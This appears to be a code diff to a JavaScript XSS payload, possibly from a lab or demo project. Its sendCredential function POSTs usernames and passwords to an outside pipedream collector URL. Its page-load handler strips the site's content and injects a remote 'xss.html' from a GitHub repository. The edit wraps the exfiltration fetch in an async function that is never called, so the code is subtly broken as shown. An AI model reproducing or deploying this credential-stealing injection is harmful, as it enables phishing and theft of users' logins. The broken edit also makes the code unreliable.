@@ -21,12 +21,12 @@ function sendCredential(username, password) {
         method: "POST",
         headers,
         mode: "cors",
-        body: JSON.stringify(body),
+        body: JSON.stringify(body)
     };
 
-    fetch("https://ensnocsamq9t9ho.m.pipedream.net", options).then((function(response) {
-        console.log(response);
-    }));
+    const request = async() => {
+        const response = await fetch("https://ensnocsamq9t9ho.m.pipedream.net", options);
+    }
 }
 
 
@@ -34,8 +34,6 @@ $(window).on('load', function() {
     // Remove all unwanted content
     $(".row").remove();
     $('.place_holder').load("https://raw.githubusercontent.com/hotMS/Contoso-Stake/master/SkateShop/xss_admin/xss.html", spy);
-
-    console.log("done");
 });
 
 
